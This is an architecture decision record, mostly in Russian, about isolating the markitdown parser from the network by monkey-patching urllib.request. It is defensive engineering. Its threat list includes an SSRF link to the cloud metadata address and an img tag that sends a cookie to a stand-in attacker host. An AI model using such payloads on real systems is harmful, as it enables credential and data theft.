# ADR-0082 — Network isolation для markitdown через monkey-patch urllib.request

* Статус: Accepted (Sprint 57 W5, 2026-06-07)
* Связано с: ADR-0050 (WAF strict + Single Entry), ADR-0061 (WAF allowlist),
  Sprint 14 V15-5 (markitdown integration), S15 R-V15-5.

## Контекст

Sprint 14 V15 ввёл markitdown как document parser для HTML/RSS/PDF/Office.
При парсинге HTML/RSS markitdown **имплицитно** вызывает `urllib.request.urlopen`
для resolve относительных ссылок (`<a href="...">` в HTML, enclosure URLs в RSS).
Без изоляции эти вызовы уходят во внешний интернет напрямую — минуя
:doc:`OutboundHttpClient </docs/tutorials/08_outbound_http_client>` (ADR-0050,
WAF strict single entry) и его allowlist (ADR-0061).

Риски при отсутствии изоляции:

* **SSRF**: относительная ссылка `<a href="http://169.254.169.254/latest/meta-data/">`
  в HTML приводит к попытке AWS IMDS resolve через urllib;
* **Data exfiltration**: `<img src="http://attacker.example/log?cookie=...">`
  в HTML может leak контент документа при resolve;
* **Allowlist bypass**: WAF работает на уровне `httpx.AsyncClient` /
  `OutboundHttpClient`, а не stdlib `urllib.request` (разные transport);
* **CI/CD exfiltration**: в CI markitdown может резолвить URL из
  third-party HTML fixtures (например, `https://example.com/...` в test docs).

Текущее решение — `src/backend/services/ai/document_parsers/_network.py`
подменяет `urllib.request.urlopen` на `_denied_urlopen` через
contextmanager `markitdown_network_disabled()` на время вызова.

## Решение

Принимаем monkey-patch pattern как каноничный механизм изоляции
markitdown от сети. Соглашения:

1. **Default-OFF network** (settings `MARKITDOWN_NETWORK_MODE='off'`):
   * `_denied_urlopen(*args, **kwargs)` raises `_NetworkDeniedError`;
   * markitdown ловит exception internally (его design) и продолжает парсинг
     без resolved resources;
   * **Любой** неожиданный outbound call = bug, который надо починить
     (markitdown должен работать в offline-режиме).

2. **WAF mode** (`network_mode='waf'`, future ADR):
   * Вместо deny → перенаправляем через `OutboundHttpClient` (ADR-0050);
   * Capability `net.outbound.<host>:external` требуется;
   * **Не реализовано** в S57 — оставлено как placeholder (см. docstring
     файла). Default-OFF остаётся safe fallback.

3. **Pattern**:
   ```python
   @contextlib.contextmanager
   def markitdown_network_disabled() -> Iterator[None]:
       original = urllib.request.urlopen
       urllib.request.urlopen = _denied_urlopen
       try:
           yield
       finally:
           urllib.request.urlopen = original
   ```
   * Restore в `finally` (гарантия даже при исключении в caller);
   * Process-global monkey-patch — допустимо потому что:
     - markitdown вызывается из process-isolated worker'ов
       (внутри :class:`MarkItDownParser` под Temporal activity /
       asyncio.Task);
     - global state восстанавливается синхронно до выхода из context;
     - threading.Lock не нужен потому что event-loop single-threaded
       для markitdown-вызовов.

4. **Testability**:
   * E2E: `tests/integration/document_parsers/test_markitdown_offline.py`
     проверяет что HTML с `<a href="https://example.com">` парсится
     без outbound вызовов (mock на `_denied_urlopen` + assert no calls).

5. **Observability**:
   * `logger.warning` срабатывает **каждый раз** при `_denied_urlopen` call
     (TODO: добавить rate-limit + counter, S57 backlog).

## Альтернативы

1. **Pass `http_client=None` параметр в markitdown**:
   markitdown 0.0.x не поддерживает injection — придётся fork
   upstream. Минусы: maintenance burden, regression risk при upstream
   обновлениях.

2. **Network namespace / cgroup isolation**:
   запускать markitdown в container без network namespace. Минусы:
   тяжёлая infra (per-call container), не подходит для low-latency
   document parsing.

3. **`requests` monkey-patch вместо `urllib.request`**:
   `requests` обёртка над urllib, monkey-patch urllib.request
   покрывает оба пути. Сейчас `requests` не в core deps
   (только `httpx`), поэтому urllib-patch достаточен.

4. **Запретить HTML/RSS в markitdown вообще**:
   Минусы: теряем функциональность (HTML → Markdown — частый use case).
   Оставляем как fallback, но не default.

## Последствия

* **Positive**: гарантированный no-network default для markitdown;
  SSRF protection на уровне парсера; интеграция с существующим WAF
  через ADR-0050 pattern.
* **Negative**: monkey-patch глобального namespace — fragile, требует
  caution при async/threading. Документировано + test coverage.
* **Migration path**: при `network_mode='waf'` — отдельный ADR с
  routing через OutboundHttpClient.

## Связанные

* ADR-0050 — WAF strict + Single Entry для исходящего HTTP
* ADR-0061 — WAF allowlist tightening
* `src/backend/services/ai/document_parsers/_network.py` — implementation
* Sprint 14 V15 — markitdown integration
* V15 R-V15-5 — network isolation requirement

## Тестовое покрытие

`tests/integration/document_parsers/test_markitdown_offline.py`:

* `test_html_with_external_links_offline` — HTML с 5 external links
  парсится, deny не происходит (markitdown игнорирует href при offline);
* `test_rss_with_external_enclosure_offline` — RSS с enclosure URL
  парсится без outbound;
* `test_pdf_offline` — PDF без external refs (control case);
* `test_network_mode_off_blocks_urlopen` — `urllib.request.urlopen` raises
  `_NetworkDeniedError` внутри context.

## История

* 2026-06-07 — принят в Sprint 57 W5 после анализа urllib usage в
  репозитории (5 usages в `_network.py` + 2 в `lineage_http_emitter.py`).
  lineage uses = config-controlled endpoint (отдельный `# noqa: S310`).
  Этот ADR фиксирует intent ТОЛЬКО для markitdown-isolation use case.
